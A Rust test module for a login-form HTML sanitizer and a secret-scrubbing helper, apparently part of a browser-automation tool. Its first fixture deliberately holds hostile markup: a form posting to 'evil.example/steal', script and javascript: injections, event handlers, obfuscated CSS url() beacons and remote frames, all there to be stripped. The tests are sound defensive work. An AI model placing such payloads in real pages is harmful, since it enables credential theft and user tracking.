#[cfg(test)]
mod tests {
    use super::*;

    const PASSWORD: &str = "Tr0ub4dor&3-Secret";

    #[test]
    fn sanitize_keeps_the_form_and_strips_what_runs_or_loads() {
        let dirty = r#"<form action="https://evil.example/steal" onsubmit="steal()" class="login">
<script>alert(1)</script><style>body{background:url(https://evil.example/x)}</style>
<label for="pw" onclick="x()">Password</label>
<input id="pw" type="password" name="pw" value="leaked" data-theuth-field="1" autocomplete="current-password" onfocus="x()">
<a href="javascript:alert(1)" style="color: red">Forgot?</a>
<button type="submit" formaction="https://evil.example/" data-theuth-field="2">Sign in</button>
<div style="background-image: url(https://evil.example/t.png); color: blue">x</div>
<div style="background: url(&quot;data:image/png;base64,AAAA&quot;); margin: 0">y</div>
<span style="background: u&#114;l(https://evil.example/e)">z</span>
<img src="https://evil.example/logo.png" alt="logo"><img src="data:image/png;base64,iVBORw0KGgo=" alt="ok">
<iframe src="https://evil.example/frame"></iframe><svg><use href="https://evil.example/s#a"/></svg>
<input data-theuth-field="x1" type="text"><!-- a comment -->
<custom-tag>kept text</custom-tag></form>"#;
        let clean = sanitize(dirty).expect("sanitize");
        for bad in [
            "script",
            "alert",
            "onsubmit",
            "onclick",
            "onfocus",
            "action=",
            "formaction",
            "href",
            "evil.example",
            "value=",
            "leaked",
            "iframe",
            "svg",
            "<style",
            "comment",
            "custom-tag",
            "x1",
        ] {
            assert!(!clean.contains(bad), "{bad} survived: {clean}");
        }
        for good in [
            r#"type="password""#,
            r#"name="pw""#,
            r#"data-theuth-field="1""#,
            r#"autocomplete="current-password""#,
            r#"class="login""#,
            r#"for="pw""#,
            "Forgot?",
            "color: red",
            "color: blue",
            "data:image/png;base64,AAAA",
            "margin: 0",
            r#"src="data:image/png;base64,iVBORw0KGgo=""#,
            r#"alt="logo""#,
            "kept text",
            "Sign in",
        ] {
            assert!(clean.contains(good), "{good} lost: {clean}");
        }
    }

    #[test]
    fn answers_parse_both_cancel_forms_and_never_debug_values() {
        let submit: ElementFormAnswer =
            serde_json::from_value(json!({ "submit": { "values": { "1": PASSWORD } } }))
                .expect("submit");
        assert!(!format!("{submit:?}").contains(PASSWORD));
        assert!(matches!(
            serde_json::from_value::<ElementFormAnswer>(json!({ "cancel": {} })),
            Ok(ElementFormAnswer::Cancel {})
        ));
        assert!(matches!(
            serde_json::from_value::<ElementFormAnswer>(json!("cancel")),
            Ok(ElementFormAnswer::Cancel {})
        ));
        assert!(
            serde_json::from_value::<ElementFormAnswer>(json!({ "submit": {}, "cancel": {} }))
                .is_err()
        );
        assert_eq!(
            serde_json::to_value(ElementFormAnswer::Cancel {}).unwrap(),
            json!({ "cancel": {} })
        );
    }

    #[test]
    fn refusals_read_as_the_design_says() {
        let frame = request(
            &json!({ "refused": "frame", "origin": "https://challenges.example" }),
            ElementFormId(uuid::Uuid::nil()),
            SessionId::new(),
            "c",
            "obscura:local".into(),
            None,
        )
        .unwrap_err();
        assert_eq!(
            frame,
            "the form contains a frame from https://challenges.example (a CAPTCHA or a sign-in provider); it can only be used in the page itself: show it to the user with show_web or browser_attach to their tile"
        );
        let big = refusal(&json!({ "refused": "size", "kib": 300 }));
        assert_eq!(
            big,
            "element too large to show (300 KiB > 256 KiB); pick a smaller element"
        );
    }

    #[test]
    fn the_origin_comes_from_the_address_in_ascii() {
        let r = request(
            &json!({
                "url": "https://bücher.example:8443/login?next=/a#top",
                "title": "Sign in",
                "html": "<form><input type=\"email\" data-theuth-field=\"0\"></form>",
                "width": 0, "height": 210,
                "fields": [{ "kind": "email", "name": "email", "label": "Email", "masked": false }],
            }),
            ElementFormId(uuid::Uuid::nil()),
            SessionId::new(),
            "c",
            "obscura:local".into(),
            Some("  "),
        )
        .expect("request");
        assert_eq!(r.origin, "https://xn--bcher-kva.example:8443");
        assert_eq!((r.width, r.height, r.title.as_str()), (400, 210, "Sign in"));
        assert_eq!(bare(&r.url), "https://xn--bcher-kva.example:8443/login");
    }

    #[test]
    fn submitted_values_are_scrubbed_raw_and_url_encoded() {
        let session = SessionId::new();
        remember(session, PASSWORD);
        remember(session, "abc");
        let encoded: String = url::form_urlencoded::byte_serialize(PASSWORD.as_bytes()).collect();
        let mut text = format!("x {PASSWORD} y ?pw={encoded} abc");
        scrub(session, &mut text);
        assert_eq!(text, "x [typed value] y ?pw=[typed value] abc");
        forget(&[session]);
        let mut again = PASSWORD.to_owned();
        scrub(session, &mut again);
        assert_eq!(again, PASSWORD);
    }
}
